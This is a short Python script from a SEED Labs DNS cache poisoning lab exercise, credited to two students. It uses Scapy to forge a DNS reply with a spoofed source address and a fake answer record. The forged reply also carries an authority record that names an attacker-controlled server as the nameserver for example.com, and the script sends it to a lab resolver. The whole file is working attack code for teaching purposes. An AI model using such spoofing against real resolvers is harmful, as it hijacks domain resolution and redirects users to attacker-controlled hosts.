"""
SEED Labs – Remote DNS Cache Poisoning Attack Lab
3.3 Task 5: Spoof DNS Replies
By: Dana Zorohov 207817529, Nir Meir 313229106
"""

from scapy.all import *
from scapy.layers.dns import DNSQR, DNS, DNSRR
from scapy.layers.inet import IP, UDP

name = 'twysw.example.com'  # target
domain = 'example.com'  # target's domain
ns =  'ns.attacker32.com' # our attacker as the name server

Qdsec = DNSQR(qname=name)
Anssec = DNSRR(rrname=name, type='A', rdata='1.2.3.4', ttl=259200)
NSsec = DNSRR(rrname=domain, type='NS', rdata=ns, ttl=259200)
dns = DNS(id=0xAAAA, aa=1, rd=1, qr=1,qdcount=1, ancount=1, nscount=1, arcount=0,qd=Qdsec, an=Anssec, ns=NSsec)
ip = IP(dst='10.0.2.10', src='199.43.133.53')
udp = UDP(dport=33333, sport=53, chksum=0)
reply = ip/udp/dns

with open('DNSresp.bin', 'wb') as f:
    f.write(bytes(reply))
    reply.show()

send(reply)